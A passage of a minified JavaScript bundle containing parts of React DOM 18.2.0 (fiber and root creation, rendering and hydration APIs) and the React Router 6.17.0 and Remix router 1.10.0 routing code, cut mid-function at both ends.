                                i.lanes |= n, a = i.alternate, a !== null && (a.lanes |= n), Cs(i.return, n, t), s.lanes |= n;
                                break
                            }
                            a = a.next
                        }
                    } else if (i.tag === 10) l = i.type === t.type ? null : i.child; else if (i.tag === 18) {
                        if (l = i.return, l === null) throw Error(T(341));
                        l.lanes |= n, s = l.alternate, s !== null && (s.lanes |= n), Cs(l, n, t), l = i.sibling
                    } else l = i.child;
                    if (l !== null) l.return = i; else for (l = i; l !== null;) {
                        if (l === t) {
                            l = null;
                            break
                        }
                        if (i = l.sibling, i !== null) {
                            i.return = l.return, l = i;
                            break
                        }
                        l = l.return
                    }
                    i = l
                }
                Oe(e, t, o.children, n), t = t.child
            }
            return t;
        case 9:
            return o = t.type, r = t.pendingProps.children, Qn(t, n), o = Je(o), r = r(o), t.flags |= 1, Oe(e, t, r, n), t.child;
        case 14:
            return r = t.type, o = tt(r, t.pendingProps), o = tt(r.type, o), lc(e, t, r, o, n);
        case 15:
            return Wf(e, t, t.type, t.pendingProps, n);
        case 17:
            return r = t.type, o = t.pendingProps, o = t.elementType === r ? o : tt(r, o), Xo(e, t), t.tag = 1, Fe(r) ? (e = !0, fi(t)) : e = !1, Qn(t, n), wf(t, r, o), ks(t, r, o, n), Ts(null, t, r, !0, e, n);
        case 19:
            return Xf(e, t, n);
        case 22:
            return Vf(e, t, n)
    }
    throw Error(T(156, t.tag))
};

function dp(e, t) {
    return $d(e, t)
}

function Qy(e, t, n, r) {
    this.tag = e, this.key = n, this.sibling = this.child = this.return = this.stateNode = this.type = this.elementType = null, this.index = 0, this.ref = null, this.pendingProps = t, this.dependencies = this.memoizedState = this.updateQueue = this.memoizedProps = null, this.mode = r, this.subtreeFlags = this.flags = 0, this.deletions = null, this.childLanes = this.lanes = 0, this.alternate = null
}

function Qe(e, t, n, r) {
    return new Qy(e, t, n, r)
}

function ba(e) {
    return e = e.prototype, !(!e || !e.isReactComponent)
}

function Xy(e) {
    if (typeof e == "function") return ba(e) ? 1 : 0;
    if (e != null) {
        if (e = e.$$typeof, e === sa) return 11;
        if (e === aa) return 14
    }
    return 2
}

function Jt(e, t) {
    var n = e.alternate;
    return n === null ? (n = Qe(e.tag, t, e.key, e.mode), n.elementType = e.elementType, n.type = e.type, n.stateNode = e.stateNode, n.alternate = e, e.alternate = n) : (n.pendingProps = t, n.type = e.type, n.flags = 0, n.subtreeFlags = 0, n.deletions = null), n.flags = e.flags & 14680064, n.childLanes = e.childLanes, n.lanes = e.lanes, n.child = e.child, n.memoizedProps = e.memoizedProps, n.memoizedState = e.memoizedState, n.updateQueue = e.updateQueue, t = e.dependencies, n.dependencies = t === null ? null : {
        lanes: t.lanes,
        firstContext: t.firstContext
    }, n.sibling = e.sibling, n.index = e.index, n.ref = e.ref, n
}

function qo(e, t, n, r, o, i) {
    var l = 2;
    if (r = e, typeof e == "function") ba(e) && (l = 1); else if (typeof e == "string") l = 5; else e:switch (e) {
        case Ln:
            return fn(n.children, o, i, t);
        case la:
            l = 8, o |= 8;
            break;
        case Ql:
            return e = Qe(12, n, t, o | 2), e.elementType = Ql, e.lanes = i, e;
        case Xl:
            return e = Qe(13, n, t, o), e.elementType = Xl, e.lanes = i, e;
        case Yl:
            return e = Qe(19, n, t, o), e.elementType = Yl, e.lanes = i, e;
        case wd:
            return Vi(n, o, i, t);
        default:
            if (typeof e == "object" && e !== null) switch (e.$$typeof) {
                case yd:
                    l = 10;
                    break e;
                case vd:
                    l = 9;
                    break e;
                case sa:
                    l = 11;
                    break e;
                case aa:
                    l = 14;
                    break e;
                case Mt:
                    l = 16, r = null;
                    break e
            }
            throw Error(T(130, e == null ? e : typeof e, ""))
    }
    return t = Qe(l, n, t, o), t.elementType = e, t.type = r, t.lanes = i, t
}

function fn(e, t, n, r) {
    return e = Qe(7, e, r, t), e.lanes = n, e
}

function Vi(e, t, n, r) {
    return e = Qe(22, e, r, t), e.elementType = wd, e.lanes = n, e.stateNode = {isHidden: !1}, e
}

function Dl(e, t, n) {
    return e = Qe(6, e, null, t), e.lanes = n, e
}

function Ml(e, t, n) {
    return t = Qe(4, e.children !== null ? e.children : [], e.key, t), t.lanes = n, t.stateNode = {
        containerInfo: e.containerInfo,
        pendingChildren: null,
        implementation: e.implementation
    }, t
}

function Yy(e, t, n, r, o) {
    this.tag = t, this.containerInfo = e, this.finishedWork = this.pingCache = this.current = this.pendingChildren = null, this.timeoutHandle = -1, this.callbackNode = this.pendingContext = this.context = null, this.callbackPriority = 0, this.eventTimes = hl(0), this.expirationTimes = hl(-1), this.entangledLanes = this.finishedLanes = this.mutableReadLanes = this.expiredLanes = this.pingedLanes = this.suspendedLanes = this.pendingLanes = 0, this.entanglements = hl(0), this.identifierPrefix = r, this.onRecoverableError = o, this.mutableSourceEagerHydrationData = null
}

function Ha(e, t, n, r, o, i, l, s, a) {
    return e = new Yy(e, t, n, s, a), t === 1 ? (t = 1, i === !0 && (t |= 8)) : t = 0, i = Qe(3, null, null, t), e.current = i, i.stateNode = e, i.memoizedState = {
        element: r,
        isDehydrated: n,
        cache: null,
        transitions: null,
        pendingSuspenseBoundaries: null
    }, Ra(i), e
}

function Jy(e, t, n) {
    var r = 3 < arguments.length && arguments[3] !== void 0 ? arguments[3] : null;
    return {$$typeof: Pn, key: r == null ? null : "" + r, children: e, containerInfo: t, implementation: n}
}

function fp(e) {
    if (!e) return Zt;
    e = e._reactInternals;
    e:{
        if (Cn(e) !== e || e.tag !== 1) throw Error(T(170));
        var t = e;
        do {
            switch (t.tag) {
                case 3:
                    t = t.stateNode.context;
                    break e;
                case 1:
                    if (Fe(t.type)) {
                        t = t.stateNode.__reactInternalMemoizedMergedChildContext;
                        break e
                    }
            }
            t = t.return
        } while (t !== null);
        throw Error(T(171))
    }
    if (e.tag === 1) {
        var n = e.type;
        if (Fe(n)) return df(e, n, t)
    }
    return t
}

function pp(e, t, n, r, o, i, l, s, a) {
    return e = Ha(n, r, !0, e, o, i, l, s, a), e.context = fp(null), n = e.current, r = Pe(), o = Yt(n), i = Ct(r, o), i.callback = t ?? null, Qt(n, i, o), e.current.lanes = o, po(e, o, r), Ae(e, r), e
}

function Ki(e, t, n, r) {
    var o = t.current, i = Pe(), l = Yt(o);
    return n = fp(n), t.context === null ? t.context = n : t.pendingContext = n, t = Ct(i, l), t.payload = {element: e}, r = r === void 0 ? null : r, r !== null && (t.callback = r), e = Qt(o, t, l), e !== null && (st(e, o, l, i), Ko(e, o, l)), l
}

function Ni(e) {
    if (e = e.current, !e.child) return null;
    switch (e.child.tag) {
        case 5:
            return e.child.stateNode;
        default:
            return e.child.stateNode
    }
}

function vc(e, t) {
    if (e = e.memoizedState, e !== null && e.dehydrated !== null) {
        var n = e.retryLane;
        e.retryLane = n !== 0 && n < t ? n : t
    }
}

function Wa(e, t) {
    vc(e, t), (e = e.alternate) && vc(e, t)
}

function qy() {
    return null
}

var mp = typeof reportError == "function" ? reportError : function (e) {
    console.error(e)
};

function Va(e) {
    this._internalRoot = e
}

Gi.prototype.render = Va.prototype.render = function (e) {
    var t = this._internalRoot;
    if (t === null) throw Error(T(409));
    Ki(e, t, null, null)
};
Gi.prototype.unmount = Va.prototype.unmount = function () {
    var e = this._internalRoot;
    if (e !== null) {
        this._internalRoot = null;
        var t = e.containerInfo;
        vn(function () {
            Ki(null, e, null, null)
        }), t[Rt] = null
    }
};

function Gi(e) {
    this._internalRoot = e
}

Gi.prototype.unstable_scheduleHydration = function (e) {
    if (e) {
        var t = Hd();
        e = {blockedOn: null, target: e, priority: t};
        for (var n = 0; n < At.length && t !== 0 && t < At[n].priority; n++) ;
        At.splice(n, 0, e), n === 0 && Vd(e)
    }
};

function Ka(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11)
}

function Qi(e) {
    return !(!e || e.nodeType !== 1 && e.nodeType !== 9 && e.nodeType !== 11 && (e.nodeType !== 8 || e.nodeValue !== " react-mount-point-unstable "))
}

function wc() {
}

function Zy(e, t, n, r, o) {
    if (o) {
        if (typeof r == "function") {
            var i = r;
            r = function () {
                var u = Ni(l);
                i.call(u)
            }
        }
        var l = pp(t, r, e, 0, null, !1, !1, "", wc);
        return e._reactRootContainer = l, e[Rt] = l.current, Zr(e.nodeType === 8 ? e.parentNode : e), vn(), l
    }
    for (; o = e.lastChild;) e.removeChild(o);
    if (typeof r == "function") {
        var s = r;
        r = function () {
            var u = Ni(a);
            s.call(u)
        }
    }
    var a = Ha(e, 0, !1, null, null, !1, !1, "", wc);
    return e._reactRootContainer = a, e[Rt] = a.current, Zr(e.nodeType === 8 ? e.parentNode : e), vn(function () {
        Ki(t, a, n, r)
    }), a
}

function Xi(e, t, n, r, o) {
    var i = n._reactRootContainer;
    if (i) {
        var l = i;
        if (typeof o == "function") {
            var s = o;
            o = function () {
                var a = Ni(l);
                s.call(a)
            }
        }
        Ki(t, l, e, o)
    } else l = Zy(n, t, e, o, r);
    return Ni(l)
}

Ud = function (e) {
    switch (e.tag) {
        case 3:
            var t = e.stateNode;
            if (t.current.memoizedState.isDehydrated) {
                var n = Ir(t.pendingLanes);
                n !== 0 && (da(t, n | 1), Ae(t, ae()), !(H & 6) && (ir = ae() + 500, nn()))
            }
            break;
        case 13:
            vn(function () {
                var r = Tt(e, 1);
                if (r !== null) {
                    var o = Pe();
                    st(r, e, 1, o)
                }
            }), Wa(e, 1)
    }
};
fa = function (e) {
    if (e.tag === 13) {
        var t = Tt(e, 134217728);
        if (t !== null) {
            var n = Pe();
            st(t, e, 134217728, n)
        }
        Wa(e, 134217728)
    }
};
bd = function (e) {
    if (e.tag === 13) {
        var t = Yt(e), n = Tt(e, t);
        if (n !== null) {
            var r = Pe();
            st(n, e, t, r)
        }
        Wa(e, t)
    }
};
Hd = function () {
    return Q
};
Wd = function (e, t) {
    var n = Q;
    try {
        return Q = e, t()
    } finally {
        Q = n
    }
};
ls = function (e, t, n) {
    switch (t) {
        case"input":
            if (Zl(e, n), t = n.name, n.type === "radio" && t != null) {
                for (n = e; n.parentNode;) n = n.parentNode;
                for (n = n.querySelectorAll("input[name=" + JSON.stringify("" + t) + '][type="radio"]'), t = 0; t < n.length; t++) {
                    var r = n[t];
                    if (r !== e && r.form === e.form) {
                        var o = zi(r);
                        if (!o) throw Error(T(90));
                        Sd(r), Zl(r, o)
                    }
                }
            }
            break;
        case"textarea":
            Ed(e, n);
            break;
        case"select":
            t = n.value, t != null && Wn(e, !!n.multiple, t, !1)
    }
};
_d = za;
Pd = vn;
var ev = {usingClientEntryPoint: !1, Events: [ho, $n, zi, jd, Od, za]},
    Rr = {findFiberByHostInstance: an, bundleType: 0, version: "18.2.0", rendererPackageName: "react-dom"}, tv = {
        bundleType: Rr.bundleType,
        version: Rr.version,
        rendererPackageName: Rr.rendererPackageName,
        rendererConfig: Rr.rendererConfig,
        overrideHookState: null,
        overrideHookStateDeletePath: null,
        overrideHookStateRenamePath: null,
        overrideProps: null,
        overridePropsDeletePath: null,
        overridePropsRenamePath: null,
        setErrorHandler: null,
        setSuspenseHandler: null,
        scheduleUpdate: null,
        currentDispatcherRef: _t.ReactCurrentDispatcher,
        findHostInstanceByFiber: function (e) {
            return e = Dd(e), e === null ? null : e.stateNode
        },
        findFiberByHostInstance: Rr.findFiberByHostInstance || qy,
        findHostInstancesForRefresh: null,
        scheduleRefresh: null,
        scheduleRoot: null,
        setRefreshHandler: null,
        getCurrentFiber: null,
        reconcilerVersion: "18.2.0-next-9e3b772b8-20220608"
    };
if (typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ < "u") {
    var Ao = __REACT_DEVTOOLS_GLOBAL_HOOK__;
    if (!Ao.isDisabled && Ao.supportsFiber) try {
        Mi = Ao.inject(tv), mt = Ao
    } catch {
    }
}
He.__SECRET_INTERNALS_DO_NOT_USE_OR_YOU_WILL_BE_FIRED = ev;
He.createPortal = function (e, t) {
    var n = 2 < arguments.length && arguments[2] !== void 0 ? arguments[2] : null;
    if (!Ka(t)) throw Error(T(200));
    return Jy(e, t, null, n)
};
He.createRoot = function (e, t) {
    if (!Ka(e)) throw Error(T(299));
    var n = !1, r = "", o = mp;
    return t != null && (t.unstable_strictMode === !0 && (n = !0), t.identifierPrefix !== void 0 && (r = t.identifierPrefix), t.onRecoverableError !== void 0 && (o = t.onRecoverableError)), t = Ha(e, 1, !1, null, null, n, !1, r, o), e[Rt] = t.current, Zr(e.nodeType === 8 ? e.parentNode : e), new Va(t)
};
He.findDOMNode = function (e) {
    if (e == null) return null;
    if (e.nodeType === 1) return e;
    var t = e._reactInternals;
    if (t === void 0) throw typeof e.render == "function" ? Error(T(188)) : (e = Object.keys(e).join(","), Error(T(268, e)));
    return e = Dd(t), e = e === null ? null : e.stateNode, e
};
He.flushSync = function (e) {
    return vn(e)
};
He.hydrate = function (e, t, n) {
    if (!Qi(t)) throw Error(T(200));
    return Xi(null, e, t, !0, n)
};
He.hydrateRoot = function (e, t, n) {
    if (!Ka(e)) throw Error(T(405));
    var r = n != null && n.hydratedSources || null, o = !1, i = "", l = mp;
    if (n != null && (n.unstable_strictMode === !0 && (o = !0), n.identifierPrefix !== void 0 && (i = n.identifierPrefix), n.onRecoverableError !== void 0 && (l = n.onRecoverableError)), t = pp(t, null, e, 1, n ?? null, o, !1, i, l), e[Rt] = t.current, Zr(e), r) for (e = 0; e < r.length; e++) n = r[e], o = n._getVersion, o = o(n._source), t.mutableSourceEagerHydrationData == null ? t.mutableSourceEagerHydrationData = [n, o] : t.mutableSourceEagerHydrationData.push(n, o);
    return new Gi(t)
};
He.render = function (e, t, n) {
    if (!Qi(t)) throw Error(T(200));
    return Xi(null, e, t, !1, n)
};
He.unmountComponentAtNode = function (e) {
    if (!Qi(e)) throw Error(T(40));
    return e._reactRootContainer ? (vn(function () {
        Xi(null, null, e, !1, function () {
            e._reactRootContainer = null, e[Rt] = null
        })
    }), !0) : !1
};
He.unstable_batchedUpdates = za;
He.unstable_renderSubtreeIntoContainer = function (e, t, n, r) {
    if (!Qi(n)) throw Error(T(200));
    if (e == null || e._reactInternals === void 0) throw Error(T(38));
    return Xi(e, t, n, !1, r)
};
He.version = "18.2.0-next-9e3b772b8-20220608";

function hp() {
    if (!(typeof __REACT_DEVTOOLS_GLOBAL_HOOK__ > "u" || typeof __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE != "function")) try {
        __REACT_DEVTOOLS_GLOBAL_HOOK__.checkDCE(hp)
    } catch (e) {
        console.error(e)
    }
}

hp(), fd.exports = He;
var gp = fd.exports;
const Hn = Ii(gp);
var xc = gp;
Kl.createRoot = xc.createRoot, Kl.hydrateRoot = xc.hydrateRoot;

/**
 * @remix-run/router v1.10.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function ao() {
    return ao = Object.assign ? Object.assign.bind() : function (e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }, ao.apply(this, arguments)
}

var Ht;
(function (e) {
    e.Pop = "POP", e.Push = "PUSH", e.Replace = "REPLACE"
})(Ht || (Ht = {}));
const Sc = "popstate";

function nv(e) {
    e === void 0 && (e = {});

    function t(r, o) {
        let {pathname: i, search: l, hash: s} = r.location;
        return zs("", {
            pathname: i,
            search: l,
            hash: s
        }, o.state && o.state.usr || null, o.state && o.state.key || "default")
    }

    function n(r, o) {
        return typeof o == "string" ? o : yp(o)
    }

    return ov(t, n, null, e)
}

function Re(e, t) {
    if (e === !1 || e === null || typeof e > "u") throw new Error(t)
}

function Ga(e, t) {
    if (!e) {
        typeof console < "u" && console.warn(t);
        try {
            throw new Error(t)
        } catch {
        }
    }
}

function rv() {
    return Math.random().toString(36).substr(2, 8)
}

function Cc(e, t) {
    return {usr: e.state, key: e.key, idx: t}
}

function zs(e, t, n, r) {
    return n === void 0 && (n = null), ao({
        pathname: typeof e == "string" ? e : e.pathname,
        search: "",
        hash: ""
    }, typeof t == "string" ? dr(t) : t, {state: n, key: t && t.key || r || rv()})
}

function yp(e) {
    let {pathname: t = "/", search: n = "", hash: r = ""} = e;
    return n && n !== "?" && (t += n.charAt(0) === "?" ? n : "?" + n), r && r !== "#" && (t += r.charAt(0) === "#" ? r : "#" + r), t
}

function dr(e) {
    let t = {};
    if (e) {
        let n = e.indexOf("#");
        n >= 0 && (t.hash = e.substr(n), e = e.substr(0, n));
        let r = e.indexOf("?");
        r >= 0 && (t.search = e.substr(r), e = e.substr(0, r)), e && (t.pathname = e)
    }
    return t
}

function ov(e, t, n, r) {
    r === void 0 && (r = {});
    let {window: o = document.defaultView, v5Compat: i = !1} = r, l = o.history, s = Ht.Pop, a = null, u = c();
    u == null && (u = 0, l.replaceState(ao({}, l.state, {idx: u}), ""));

    function c() {
        return (l.state || {idx: null}).idx
    }

    function d() {
        s = Ht.Pop;
        let C = c(), g = C == null ? null : C - u;
        u = C, a && a({action: s, location: v.location, delta: g})
    }

    function p(C, g) {
        s = Ht.Push;
        let h = zs(v.location, C, g);
        n && n(h, C), u = c() + 1;
        let w = Cc(h, u), S = v.createHref(h);
        try {
            l.pushState(w, "", S)
        } catch (E) {
            if (E instanceof DOMException && E.name === "DataCloneError") throw E;
            o.location.assign(S)
        }
        i && a && a({action: s, location: v.location, delta: 1})
    }

    function x(C, g) {
        s = Ht.Replace;
        let h = zs(v.location, C, g);
        n && n(h, C), u = c();
        let w = Cc(h, u), S = v.createHref(h);
        l.replaceState(w, "", S), i && a && a({action: s, location: v.location, delta: 0})
    }

    function y(C) {
        let g = o.location.origin !== "null" ? o.location.origin : o.location.href,
            h = typeof C == "string" ? C : yp(C);
        return Re(g, "No window.location.(origin|href) available to create URL for href: " + h), new URL(h, g)
    }

    let v = {
        get action() {
            return s
        }, get location() {
            return e(o, l)
        }, listen(C) {
            if (a) throw new Error("A history only accepts one active listener");
            return o.addEventListener(Sc, d), a = C, () => {
                o.removeEventListener(Sc, d), a = null
            }
        }, createHref(C) {
            return t(o, C)
        }, createURL: y, encodeLocation(C) {
            let g = y(C);
            return {pathname: g.pathname, search: g.search, hash: g.hash}
        }, push: p, replace: x, go(C) {
            return l.go(C)
        }
    };
    return v
}

var Ec;
(function (e) {
    e.data = "data", e.deferred = "deferred", e.redirect = "redirect", e.error = "error"
})(Ec || (Ec = {}));

function iv(e, t, n) {
    n === void 0 && (n = "/");
    let r = typeof t == "string" ? dr(t) : t, o = xp(r.pathname || "/", n);
    if (o == null) return null;
    let i = vp(e);
    lv(i);
    let l = null;
    for (let s = 0; l == null && s < i.length; ++s) l = hv(i[s], vv(o));
    return l
}

function vp(e, t, n, r) {
    t === void 0 && (t = []), n === void 0 && (n = []), r === void 0 && (r = "");
    let o = (i, l, s) => {
        let a = {
            relativePath: s === void 0 ? i.path || "" : s,
            caseSensitive: i.caseSensitive === !0,
            childrenIndex: l,
            route: i
        };
        a.relativePath.startsWith("/") && (Re(a.relativePath.startsWith(r), 'Absolute route path "' + a.relativePath + '" nested under path ' + ('"' + r + '" is not valid. An absolute child route path ') + "must start with the combined path of all its parent routes."), a.relativePath = a.relativePath.slice(r.length));
        let u = pn([r, a.relativePath]), c = n.concat(a);
        i.children && i.children.length > 0 && (Re(i.index !== !0, "Index routes must not have child routes. Please remove " + ('all child routes from route path "' + u + '".')), vp(i.children, t, c, u)), !(i.path == null && !i.index) && t.push({
            path: u,
            score: pv(u, i.index),
            routesMeta: c
        })
    };
    return e.forEach((i, l) => {
        var s;
        if (i.path === "" || !((s = i.path) != null && s.includes("?"))) o(i, l); else for (let a of wp(i.path)) o(i, l, a)
    }), t
}

function wp(e) {
    let t = e.split("/");
    if (t.length === 0) return [];
    let [n, ...r] = t, o = n.endsWith("?"), i = n.replace(/\?$/, "");
    if (r.length === 0) return o ? [i, ""] : [i];
    let l = wp(r.join("/")), s = [];
    return s.push(...l.map(a => a === "" ? i : [i, a].join("/"))), o && s.push(...l), s.map(a => e.startsWith("/") && a === "" ? "/" : a)
}

function lv(e) {
    e.sort((t, n) => t.score !== n.score ? n.score - t.score : mv(t.routesMeta.map(r => r.childrenIndex), n.routesMeta.map(r => r.childrenIndex)))
}

const sv = /^:\w+$/, av = 3, uv = 2, cv = 1, dv = 10, fv = -2, kc = e => e === "*";

function pv(e, t) {
    let n = e.split("/"), r = n.length;
    return n.some(kc) && (r += fv), t && (r += uv), n.filter(o => !kc(o)).reduce((o, i) => o + (sv.test(i) ? av : i === "" ? cv : dv), r)
}

function mv(e, t) {
    return e.length === t.length && e.slice(0, -1).every((r, o) => r === t[o]) ? e[e.length - 1] - t[t.length - 1] : 0
}

function hv(e, t) {
    let {routesMeta: n} = e, r = {}, o = "/", i = [];
    for (let l = 0; l < n.length; ++l) {
        let s = n[l], a = l === n.length - 1, u = o === "/" ? t : t.slice(o.length) || "/",
            c = gv({path: s.relativePath, caseSensitive: s.caseSensitive, end: a}, u);
        if (!c) return null;
        Object.assign(r, c.params);
        let d = s.route;
        i.push({
            params: r,
            pathname: pn([o, c.pathname]),
            pathnameBase: kv(pn([o, c.pathnameBase])),
            route: d
        }), c.pathnameBase !== "/" && (o = pn([o, c.pathnameBase]))
    }
    return i
}

function gv(e, t) {
    typeof e == "string" && (e = {path: e, caseSensitive: !1, end: !0});
    let [n, r] = yv(e.path, e.caseSensitive, e.end), o = t.match(n);
    if (!o) return null;
    let i = o[0], l = i.replace(/(.)\/+$/, "$1"), s = o.slice(1);
    return {
        params: r.reduce((u, c, d) => {
            if (c === "*") {
                let p = s[d] || "";
                l = i.slice(0, i.length - p.length).replace(/(.)\/+$/, "$1")
            }
            return u[c] = wv(s[d] || "", c), u
        }, {}), pathname: i, pathnameBase: l, pattern: e
    }
}

function yv(e, t, n) {
    t === void 0 && (t = !1), n === void 0 && (n = !0), Ga(e === "*" || !e.endsWith("*") || e.endsWith("/*"), 'Route path "' + e + '" will be treated as if it were ' + ('"' + e.replace(/\*$/, "/*") + '" because the `*` character must ') + "always follow a `/` in the pattern. To get rid of this warning, " + ('please change the route path to "' + e.replace(/\*$/, "/*") + '".'));
    let r = [],
        o = "^" + e.replace(/\/*\*?$/, "").replace(/^\/*/, "/").replace(/[\\.*+^$?{}|()[\]]/g, "\\$&").replace(/\/:(\w+)/g, (l, s) => (r.push(s), "/([^\\/]+)"));
    return e.endsWith("*") ? (r.push("*"), o += e === "*" || e === "/*" ? "(.*)$" : "(?:\\/(.+)|\\/*)$") : n ? o += "\\/*$" : e !== "" && e !== "/" && (o += "(?:(?=\\/|$))"), [new RegExp(o, t ? void 0 : "i"), r]
}

function vv(e) {
    try {
        return decodeURI(e)
    } catch (t) {
        return Ga(!1, 'The URL path "' + e + '" could not be decoded because it is is a malformed URL segment. This is probably due to a bad percent ' + ("encoding (" + t + ").")), e
    }
}

function wv(e, t) {
    try {
        return decodeURIComponent(e)
    } catch (n) {
        return Ga(!1, 'The value for the URL param "' + t + '" will not be decoded because' + (' the string "' + e + '" is a malformed URL segment. This is probably') + (" due to a bad percent encoding (" + n + ").")), e
    }
}

function xp(e, t) {
    if (t === "/") return e;
    if (!e.toLowerCase().startsWith(t.toLowerCase())) return null;
    let n = t.endsWith("/") ? t.length - 1 : t.length, r = e.charAt(n);
    return r && r !== "/" ? null : e.slice(n) || "/"
}

function xv(e, t) {
    t === void 0 && (t = "/");
    let {pathname: n, search: r = "", hash: o = ""} = typeof e == "string" ? dr(e) : e;
    return {pathname: n ? n.startsWith("/") ? n : Sv(n, t) : t, search: Nv(r), hash: Rv(o)}
}

function Sv(e, t) {
    let n = t.replace(/\/+$/, "").split("/");
    return e.split("/").forEach(o => {
        o === ".." ? n.length > 1 && n.pop() : o !== "." && n.push(o)
    }), n.length > 1 ? n.join("/") : "/"
}

function $l(e, t, n, r) {
    return "Cannot include a '" + e + "' character in a manually specified " + ("`to." + t + "` field [" + JSON.stringify(r) + "].  Please separate it out to the ") + ("`to." + n + "` field. Alternatively you may provide the full path as ") + 'a string in <Link to="..."> and the router will parse it for you.'
}

function Cv(e) {
    return e.filter((t, n) => n === 0 || t.route.path && t.route.path.length > 0)
}

function Ev(e, t, n, r) {
    r === void 0 && (r = !1);
    let o;
    typeof e == "string" ? o = dr(e) : (o = ao({}, e), Re(!o.pathname || !o.pathname.includes("?"), $l("?", "pathname", "search", o)), Re(!o.pathname || !o.pathname.includes("#"), $l("#", "pathname", "hash", o)), Re(!o.search || !o.search.includes("#"), $l("#", "search", "hash", o)));
    let i = e === "" || o.pathname === "", l = i ? "/" : o.pathname, s;
    if (r || l == null) s = n; else {
        let d = t.length - 1;
        if (l.startsWith("..")) {
            let p = l.split("/");
            for (; p[0] === "..";) p.shift(), d -= 1;
            o.pathname = p.join("/")
        }
        s = d >= 0 ? t[d] : "/"
    }
    let a = xv(o, s), u = l && l !== "/" && l.endsWith("/"), c = (i || l === ".") && n.endsWith("/");
    return !a.pathname.endsWith("/") && (u || c) && (a.pathname += "/"), a
}

const pn = e => e.join("/").replace(/\/\/+/g, "/"), kv = e => e.replace(/\/+$/, "").replace(/^\/*/, "/"),
    Nv = e => !e || e === "?" ? "" : e.startsWith("?") ? e : "?" + e,
    Rv = e => !e || e === "#" ? "" : e.startsWith("#") ? e : "#" + e;

function Tv(e) {
    return e != null && typeof e.status == "number" && typeof e.statusText == "string" && typeof e.internal == "boolean" && "data" in e
}

const Sp = ["post", "put", "patch", "delete"];
new Set(Sp);
const jv = ["get", ...Sp];
new Set(jv);

/**
 * React Router v6.17.0
 *
 * Copyright (c) Remix Software Inc.
 *
 * This source code is licensed under the MIT license found in the
 * LICENSE.md file in the root directory of this source tree.
 *
 * @license MIT
 */function Ri() {
    return Ri = Object.assign ? Object.assign.bind() : function (e) {
        for (var t = 1; t < arguments.length; t++) {
            var n = arguments[t];
            for (var r in n) Object.prototype.hasOwnProperty.call(n, r) && (e[r] = n[r])
        }
        return e
    }, Ri.apply(this, arguments)
}

const Qa = f.createContext(null), Ov = f.createContext(null), Yi = f.createContext(null), Ji = f.createContext(null),
    fr = f.createContext({outlet: null, matches: [], isDataRoute: !1}), Cp = f.createContext(null);

function qi() {
    return f.useContext(Ji) != null
}

function Ep() {
    return qi() || Re(!1), f.useContext(Ji).location
}

function kp(e) {
    f.useContext(Yi).static || f.useLayoutEffect(e)
}

function Zi() {
    let {isDataRoute: e} = f.useContext(fr);
    return e ? bv() : _v()
}

function _v() {
    qi() || Re(!1);
    let e = f.useContext(Qa), {
            basename: t,
            navigator: n
        } = f.useContext(Yi), {matches: r} = f.useContext(fr), {pathname: o} = Ep(),
        i = JSON.stringify(Cv(r).map(a => a.pathnameBase)), l = f.useRef(!1);
    return kp(() => {
        l.current = !0
    }), f.useCallback(function (a, u) {
        if (u === void 0 && (u = {}), !l.current) return;
        if (typeof a == "number") {
            n.go(a);
            return
        }
        let c = Ev(a, JSON.parse(i), o, u.relative === "path");
        e == null && t !== "/" && (c.pathname = c.pathname === "/" ? t : pn([t, c.pathname])), (u.replace ? n.replace : n.push)(c, u.state, u)
    }, [t, n, i, o, e])
}

function Pv(e, t) {
    return Lv(e, t)
}

function Lv(e, t, n) {
    qi() || Re(!1);
    let {navigator: r} = f.useContext(Yi), {matches: o} = f.useContext(fr), i = o[o.length - 1], l = i ? i.params : {};
    i && i.pathname;
    let s = i ? i.pathnameBase : "/";
    i && i.route;
    let a = Ep(), u;
    if (t) {
        var c;
        let v = typeof t == "string" ? dr(t) : t;
        s === "/" || (c = v.pathname) != null && c.startsWith(s) || Re(!1), u = v
    } else u = a;
    let d = u.pathname || "/", p = s === "/" ? d : d.slice(s.length) || "/", x = iv(e, {pathname: p}),
        y = Fv(x && x.map(v => Object.assign({}, v, {
            params: Object.assign({}, l, v.params),
            pathname: pn([s, r.encodeLocation ? r.encodeLocation(v.pathname).pathname : v.pathname]),
            pathnameBase: v.pathnameBase === "/" ? s : pn([s, r.encodeLocation ? r.encodeLocation(v.pathnameBase).pathname : v.pathnameBase])
        })), o, n);
    return t && y ? f.createElement(Ji.Provider, {
        value: {
            location: Ri({
                pathname: "/",
                search: "",
                hash: "",
                state: null,
                key: "default"
            }, u), navigationType: Ht.Pop
        }
    }, y) : y
}

function Iv() {
    let e = Uv(), t = Tv(e) ? e.status + " " + e.statusText : e instanceof Error ? e.message : JSON.stringify(e),
        n = e instanceof Error ? e.stack : null, o = {padding: "0.5rem", backgroundColor: "rgba(200,200,200, 0.5)"},
        i = null;
    return f.createElement(f.Fragment, null, f.createElement("h2", null, "Unexpected Application Error!"), f.createElement("h3", {style: {fontStyle: "italic"}}, t), n ? f.createElement("pre", {style: o}, n) : null, i)
}

const Dv = f.createElement(Iv, null);

class Mv extends f.Component {
    constructor(t) {
        super(t), this.state = {location: t.location, revalidation: t.revalidation, error: t.error}
    }

    static getDerivedStateFromError(t) {
        return {error: t}
    }

    static getDerivedStateFromProps(t, n) {
        return n.location !== t.location || n.revalidation !== "idle" && t.revalidation === "idle" ? {
            error: t.error,
            location: t.location,
            revalidation: t.revalidation
        } : {error: t.error || n.error, location: n.location, revalidation: t.revalidation || n.revalidation}
    }

    componentDidCatch(t, n) {
        console.error("React Router caught the following error during render", t, n)
    }

    render() {
        return this.state.error ? f.createElement(fr.Provider, {value: this.props.routeContext}, f.createElement(Cp.Provider, {
            value: this.state.error,
            children: this.props.component
        })) : this.props.children
    }
}

function $v(e) {
    let {routeContext: t, match: n, children: r} = e, o = f.useContext(Qa);
    return o && o.static && o.staticContext && (n.route.errorElement || n.route.ErrorBoundary) && (o.staticContext._deepestRenderedBoundaryId = n.route.id), f.createElement(fr.Provider, {value: t}, r)
}

function Fv(e, t, n) {
    var r;
